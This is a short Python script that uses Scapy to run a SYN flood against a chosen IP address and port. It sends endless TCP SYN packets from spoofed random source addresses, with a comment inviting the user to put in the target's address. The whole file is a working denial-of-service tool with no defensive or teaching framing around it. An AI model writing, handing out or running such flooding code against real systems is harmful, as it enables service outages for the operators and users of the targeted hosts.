from scapy.all import *

def syn_flood(target_ip, target_port):
    while True:
        s_port = random.randint(1024, 65535) 
        ip_pkt = IP(src=RandIP(), dst=target_ip) 
        tcp_pkt = TCP(sport=s_port, dport=target_port, flags='S') 
        send(ip_pkt/tcp_pkt, verbose=0) 

if __name__ == '__main__': 
    target_ip = "192.168.1.100"  # Replace with the target's IP address 
    target_port = 80  # Taget Port (HTTP)   

    syn_flood(target_ip, target_port)

